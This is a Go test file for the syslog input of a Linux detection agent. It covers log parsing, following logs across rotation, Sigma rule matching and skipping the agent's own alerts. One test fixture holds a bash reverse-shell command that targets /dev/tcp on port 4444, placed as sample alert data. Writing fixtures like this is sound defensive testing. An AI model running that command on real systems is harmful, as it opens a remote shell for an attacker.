package syslog

import (
	"bufio"
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/Nextron-Labs/aurora-linux/lib/consumer/sigma"
	"github.com/Nextron-Labs/aurora-linux/lib/provider"
	log "github.com/sirupsen/logrus"
)

func TestParseLine(t *testing.T) {
	cases := []struct {
		line                 string
		host, prog, pid, msg string
		facility, severity   string
	}{
		{"Dec 21 16:42:19 testserver useradd[1337]: new user: name=john, UID=0, GID=0",
			"testserver", "useradd", "1337", "new user: name=john, UID=0, GID=0", "", ""},
		{"Nov  9 08:01:02 web1 sshd[22]: error in libcrypto", "web1", "sshd", "22", "error in libcrypto", "", ""},
		{"<38>Nov  9 08:01:02 web1 sshd[22]: Accepted publickey", "web1", "sshd", "22", "Accepted publickey", "auth", "info"},
		{"<165>1 2026-11-09T10:00:00Z host1 app 777 ID47 - hello world", "host1", "app", "777", "hello world", "local4", "notice"},
		{"2026-11-09T10:00:00+01:00 host2 kernel: device eth0 entered promiscuous mode", "host2", "kernel", "", "device eth0 entered promiscuous mode", "", ""},
		{"just a bare message without header", "", "", "", "just a bare message without header", "", ""},
	}
	for _, c := range cases {
		p := ParseLine(c.line)
		if p.Hostname != c.host || p.Program != c.prog || p.PID != c.pid || p.Message != c.msg ||
			p.Facility != c.facility || p.Severity != c.severity {
			t.Errorf("%q => %+v", c.line, p)
		}
	}
}

func TestServicesFor(t *testing.T) {
	join := func(p string) string { return strings.Join(ServicesFor(p, ""), ",") }
	for prog, want := range map[string]string{
		"sshd": "syslog,sshd,auth", "CRON": "syslog,cron", "crontab": "syslog,cron",
		"/usr/sbin/vsftpd": "syslog,vsftpd", "clamd": "syslog,clamav", "named": "syslog", "": "syslog",
		"sshd-session": "syslog,sshd,auth",
	} {
		if got := join(prog); got != want {
			t.Errorf("ServicesFor(%q) = %s, want %s", prog, got, want)
		}
	}
}

func TestParseJournalLine(t *testing.T) {
	line := `{"MESSAGE":"Failed password for root","SYSLOG_IDENTIFIER":"sshd","_PID":"99","_HOSTNAME":"h","PRIORITY":"4","SYSLOG_FACILITY":"10","__REALTIME_TIMESTAMP":"1700000000000000"}`
	p, raw, ts, _, ok := parseJournalLine([]byte(line))
	if !ok || p.Program != "sshd" || p.PID != "99" || p.Severity != "warning" || p.Facility != "authpriv" ||
		ts.Unix() != 1700000000 || !strings.Contains(raw, "Failed password") {
		t.Fatalf("got %+v %q %v %v", p, raw, ts, ok)
	}
	// Byte-array MESSAGE (non-printable content) is decoded, not dropped.
	if p, _, _, _, ok := parseJournalLine([]byte(`{"MESSAGE":[104,105,0]}`)); !ok || !strings.HasPrefix(p.Message, "hi") {
		t.Fatalf("byte-array MESSAGE: %q %v", p.Message, ok)
	}
	if _, _, _, _, ok := parseJournalLine([]byte(`{"MESSAGE":{"x":1}}`)); ok {
		t.Fatal("malformed MESSAGE accepted")
	}
}

type collector struct {
	mu     sync.Mutex
	events []provider.Event
}

func (c *collector) add(e provider.Event) { c.mu.Lock(); c.events = append(c.events, e); c.mu.Unlock() }
func (c *collector) wait(t *testing.T, n int) []provider.Event {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		c.mu.Lock()
		if len(c.events) >= n {
			out := append([]provider.Event(nil), c.events...)
			c.mu.Unlock()
			return out
		}
		c.mu.Unlock()
		time.Sleep(20 * time.Millisecond)
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	t.Fatalf("got %d events, want %d", len(c.events), n)
	return nil
}

func appendLine(t *testing.T, path, line string) {
	t.Helper()
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0o600)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	if _, err := f.WriteString(line + "\n"); err != nil {
		t.Fatal(err)
	}
}

func TestTailFollowsRotationAndSkipsSelf(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "syslog")
	appendLine(t, path, "Nov  9 08:00:00 h old[1]: pre-existing line must be skipped")

	p := New([]string{path}, false)
	col := &collector{}
	done := make(chan struct{})
	go func() { p.SendEvents(col.add); close(done) }()
	defer func() { p.Close(); <-done }()
	time.Sleep(400 * time.Millisecond)

	appendLine(t, path, "Nov  9 08:00:01 h sshd[5]: error in libcrypto")
	appendLine(t, path, "Nov  9 08:00:02 h aurora[9]: Sigma match sigma_rule=abc sigma_title=x")
	got := col.wait(t, 1)
	if len(got) != 1 || got[0].Value("program").String != "sshd" || got[0].Value("message").String != "error in libcrypto" {
		t.Fatalf("unexpected first event: %v", got)
	}

	// logrotate: move the file away and start a new one.
	if err := os.Rename(path, path+".1"); err != nil {
		t.Fatal(err)
	}
	appendLine(t, path, "Nov  9 08:00:03 h cron[7]: after rotation")
	got = col.wait(t, 2)
	if got[1].Value("message").String != "after rotation" {
		t.Fatalf("event after rotation missing: %v", got[1].Value("message"))
	}
	if svc := got[1].(*syslogEvent).Services(); strings.Join(svc, ",") != "syslog,cron" {
		t.Fatalf("services = %v", svc)
	}
	for _, e := range got {
		if strings.Contains(e.Value("raw").String, "Sigma match") || strings.Contains(e.Value("raw").String, "pre-existing") {
			t.Fatalf("event must have been skipped: %v", e.Value("raw"))
		}
	}
}

// End to end against the real SigmaHQ linux/builtin rules: service rules fire
// only on their own service, generic keyword rules fire on any syslog line.
func TestBuiltinRulesMatchSyslogEvents(t *testing.T) {
	home, _ := os.UserHomeDir()
	dir := os.Getenv("AURORA_SIGMA_BUILTIN_RULES")
	if dir == "" {
		dir = filepath.Join(home, "sigma", "rules", "linux", "builtin")
	}
	if st, err := os.Stat(dir); err != nil || !st.IsDir() {
		t.Skipf("builtin rules not found at %s", dir)
	}

	var out bytes.Buffer
	lg := log.New()
	lg.SetOutput(&out)
	c := sigma.New(sigma.Config{
		RuleDirs: []string{dir}, MinLevel: "info", Logger: lg, NoCollapseWS: true,
		LogsourceServices: AllServices,
		FieldKnown:        func(_, f string) bool { return KnownFields[f] },
	})
	if err := c.InitializeWithRules([]string{dir}); err != nil {
		t.Fatal(err)
	}

	p := New(nil, false)
	feed := func(line string) int {
		before := c.Matches()
		p.handleLine(line, "test", func(e provider.Event) { _ = c.HandleEvent(e) })
		return int(c.Matches() - before)
	}

	hits := []string{
		"Nov  9 08:00:00 h crontab[12]: (root) REPLACE (root)",                                    // cron service
		"Nov  9 08:00:00 h sshd[3]: fatal: error in libcrypto",                                    // sshd service
		"Nov  9 08:00:00 h vsftpd[4]: Connection refused: tcp_wrappers denial.",                   // vsftpd
		"Nov  9 08:00:00 h clamd[5]: /tmp/x: Trojan.Agent FOUND",                                  // clamav
		"Nov  9 08:00:00 h guacd[6]: user joined (2 users now present)",                           // guacamole
		"Nov  9 08:00:00 h systemd[1]: stopping firewalld",                                        // syslog service
		"Nov  9 08:00:00 h useradd[7]: new user: name=john, UID=0, GID=0, home=/h, shell=/bin/sh", // generic
		"Nov  9 08:00:00 h kernel: device eth0 entered promiscuous mode",                          // generic
	}
	for _, l := range hits {
		if feed(l) == 0 {
			t.Errorf("no rule matched: %s", l)
		}
	}

	// Routing: 'REPLACE' only means something for the cron service.
	if n := feed("Nov  9 08:00:00 h nginx[8]: REPLACE ALL THE THINGS"); n != 0 {
		t.Errorf("cron rule fired on a non-cron program (%d matches)", n)
	}
	if n := feed("Nov  9 08:00:00 h cron[9]: (root) CMD (run-parts /etc/cron.hourly)"); n != 0 {
		t.Errorf("benign cron line matched (%d)", n)
	}
	// Excluded as never matching earlier? None of the builtin service rules may be.
	for _, ex := range c.Excluded() {
		t.Errorf("rule unexpectedly excluded: %s (%s)", ex.Title, ex.Reason)
	}
}

func TestPartialLinesAreNotSplit(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "log")
	if err := os.WriteFile(path, nil, 0o600); err != nil {
		t.Fatal(err)
	}
	p := New([]string{path}, false)
	col := &collector{}
	done := make(chan struct{})
	go func() { p.SendEvents(col.add); close(done) }()
	defer func() { p.Close(); <-done }()
	time.Sleep(400 * time.Millisecond)

	f, _ := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0o600)
	defer f.Close()
	f.WriteString("Nov  9 08:00:00 h sshd[1]: first half of ")
	time.Sleep(600 * time.Millisecond) // reader hits EOF mid-line
	f.WriteString("the message\n")
	got := col.wait(t, 1)
	time.Sleep(300 * time.Millisecond)
	col.mu.Lock()
	n := len(col.events)
	col.mu.Unlock()
	if n != 1 || got[0].Value("message").String != "first half of the message" {
		t.Fatalf("events=%d message=%q", n, got[0].Value("message").String)
	}
}

func TestOversizedLineIsTruncated(t *testing.T) {
	lr := lineReader{r: bufio.NewReaderSize(strings.NewReader(strings.Repeat("A", 200000)+"\nnext\n"), 4096)}
	l1, ok := lr.next()
	if !ok || len(l1) != maxLineBytes {
		t.Fatalf("len=%d ok=%v", len(l1), ok)
	}
	if l2, ok := lr.next(); !ok || l2 != "next" {
		t.Fatalf("second line = %q", l2)
	}
}

func TestSelfAlertLinesAreSkipped(t *testing.T) {
	p := New(nil, false)
	var got []provider.Event
	cb := func(e provider.Event) { got = append(got, e) }
	p.handleLine(`Nov  9 08:00:00 h rsyslogd[1]: {"level":"warning","message":"Sigma match","sigma_rule":"x","raw":"bash -i >& /dev/tcp/1.2.3.4/4444"}`, "t", cb)
	p.handleLine(`Nov  9 08:00:00 h other[2]: Aurora tamper alert: x alert_type=tamper tamper_kind=signal`, "t", cb)
	p.handleLine(`<14>1 2026-11-09T08:00:00Z h aurora - - - Sigma match sigma_rule=abc sigma_title="x"`, "t", cb)
	p.handleLine(`Nov  9 08:00:00 h aurora[5]: 2026-11-09T08:00:00Z WARNING IOC match ioc_type=filename value=x`, "t", cb)
	p.handleLine(`Nov  9 08:00:00 h sudo[3]: pam_unix(sudo:auth): authentication failure`, "t", cb)
	if len(got) != 1 {
		t.Fatalf("got %d events, want only the sudo line", len(got))
	}
	if svc := strings.Join(got[0].(*syslogEvent).Services(), ","); !strings.Contains(svc, "auth") {
		t.Fatalf("sudo line services = %s", svc)
	}
}

func TestNonRegularFilesAreRefused(t *testing.T) {
	dir := t.TempDir()
	fifo := filepath.Join(dir, "fifo")
	if err := syscall.Mkfifo(fifo, 0o600); err != nil {
		t.Skip(err)
	}
	p := New([]string{fifo}, false)
	done := make(chan struct{})
	go func() { p.SendEvents(func(provider.Event) {}); close(done) }()
	time.Sleep(300 * time.Millisecond)
	p.Close()
	select {
	case <-done:
	case <-time.After(3 * time.Second):
		t.Fatal("tailer blocked on a FIFO")
	}
}

// Marker strings inside an otherwise normal line are attacker-controlled
// and must not hide it.
func TestEmbeddedAlertMarkersDoNotHideLines(t *testing.T) {
	p := New(nil, false)
	var got []provider.Event
	cb := func(e provider.Event) { got = append(got, e) }
	lines := []string{
		`Nov  9 08:00:00 h sshd[7]: Invalid user sigma_rule=x from 10.0.0.5 port 4242`,
		`Nov  9 08:00:00 h sshd[7]: Failed password for invalid user "sigma_rule":1 from 10.0.0.5 port 1`,
		`Nov  9 08:00:00 h aurora[8]: Accepted password for root ioc_type=x`,
		`Nov  9 08:00:00 h app[9]: {"message":"login","sigma_rule":"x"}`,
		`Nov  9 08:00:00 h app[9]: user said Sigma match sigma_rule=x`,
	}
	for _, l := range lines {
		p.handleLine(l, "t", cb)
	}
	if len(got) != len(lines) {
		t.Fatalf("got %d of %d lines", len(got), len(lines))
	}
}
